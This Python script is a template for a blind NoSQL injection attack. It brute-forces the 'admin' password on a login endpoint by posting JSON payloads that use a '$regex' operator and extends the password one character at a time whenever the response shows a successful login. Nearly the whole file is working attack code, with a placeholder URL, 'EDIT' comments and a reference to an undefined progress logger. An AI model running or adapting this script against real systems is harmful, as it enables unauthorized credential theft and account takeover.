import requests, time, sys, signal, string

# Signal handler for clean program exit
def def_handler(sig, frame):
    print("\n\n [!]Exiting... ")
    sys.exit(1)

# Set up signal handler for Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables

# EDIT: Replace with the actual login endpoint URL
login_url = "http://..." # Edit this line with the correct URL

# Characters to use in the brute force attack
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    password = ""

    # EDIT: Import the 'log' library or replace with print statements
    p1 = log.progress("Brute force")
    p1.status("Initializing process...")

    for position in range(1, 24):  # Tries up to 23 characters in length
        for character in characters:
            # Construct the payload for NoSQL injection
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
            headers = {'Content-Type': 'application/json'}
            
            # Send POST request
            r = requests.post(login_url, headers=headers, data=post_data)

            # Check if authentication was successful
            if "Logged in as user" in r.text:
                password += character
                break

    # EDIT: Add code to handle the final result, for example:
    # print(f"Password found: {password}")

# Main entry point of the script
if __name__ == '__main__':
    makeNoSQLI()
